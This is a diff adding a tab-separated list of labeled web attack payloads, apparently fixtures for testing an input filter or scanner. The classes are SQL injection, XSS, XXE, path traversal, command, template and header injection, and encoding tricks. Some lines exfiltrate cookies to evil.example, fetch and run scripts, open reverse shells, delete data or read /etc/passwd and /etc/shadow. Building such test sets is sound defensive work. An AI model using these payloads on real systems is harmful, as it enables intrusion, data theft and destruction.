@@ -1,0 +1,63 @@
+sql_injection	' OR '1'='1
+sql_injection	1' OR 1=1--
+sql_injection	admin'--
+sql_injection	1 UNION SELECT username, password FROM users
+sql_injection	id=1; DROP TABLE users;--
+sql_injection	' UNION ALL SELECT NULL,NULL,version()--
+sql_injection	1' AND SLEEP(5)#
+sql_injection	q=1%27%20OR%20%271%27%3D%271
+sql_injection	') OR ('a'='a
+sql_injection	1; WAITFOR DELAY '0:0:5'--
+sql_injection	name=x' AND 1=CONVERT(int,(SELECT @@version))--
+sql_injection	/products?id=10 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables
+markup_injection	<script>alert(1)</script>
+markup_injection	<img src=x onerror=alert(document.cookie)>
+markup_injection	"><svg onload=alert(1)>
+markup_injection	javascript:alert(1)
+markup_injection	<iframe src="javascript:alert('xss')"></iframe>
+markup_injection	q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+markup_injection	<body onload=fetch('//evil.example/'+document.cookie)>
+markup_injection	'"><img src=x onerror=prompt(1)>
+markup_injection	<a href="javascript:void(0)" onclick="alert(1)">x</a>
+markup_injection	<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+path_traversal	../../../../etc/passwd
+path_traversal	..\..\..\windows\win.ini
+path_traversal	/download?file=../../../../etc/shadow
+path_traversal	%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+path_traversal	....//....//....//etc/passwd
+path_traversal	file:///etc/passwd
+path_traversal	/static/..%2f..%2f..%2fetc%2fpasswd
+path_traversal	page=../../../../../../proc/self/environ
+path_traversal	..%5c..%5c..%5cboot.ini
+command_injection	; cat /etc/passwd
+command_injection	| ls -la
+command_injection	`id`
+command_injection	$(whoami)
+command_injection	127.0.0.1; rm -rf /
+command_injection	host=example.com && curl http://evil.example/x.sh | sh
+command_injection	a|nc -e /bin/sh 10.0.0.1 4444
+command_injection	;wget${IFS}http://evil.example/a
+command_injection	& ping -c 10 127.0.0.1 &
+command_injection	test; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+template_injection	{{7*7}}
+template_injection	${7*7}
+template_injection	${jndi:ldap://evil.example/a}
+template_injection	<%= system('id') %>
+template_injection	#{7*7}
+template_injection	{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+template_injection	${T(java.lang.Runtime).getRuntime().exec('id')}
+template_injection	{{''.__class__.__mro__[1].__subclasses__()}}
+template_injection	name={{constructor.constructor('alert(1)')()}}
+header_injection	%0d%0aSet-Cookie:%20admin=true
+header_injection	/redirect?url=http://example.com%0d%0aLocation:%20http://evil.example
+header_injection	value%0aX-Injected: 1
+header_injection	foo%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK
+obfuscation	%252e%252e%252f%252e%252e%252fetc%252fpasswd
+obfuscation	%u003cscript%u003ealert(1)%u003c/script%u003e
+obfuscation	&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+obfuscation	\x3cscript\x3ealert(1)\x3c/script\x3e
+obfuscation	UN/**/ION/**/SEL/**/ECT
+obfuscation	%25252e%25252e%25252f
+malformed	%zz%gg%1
+malformed	abc%
+malformed	%e0%80%af%c0%ae
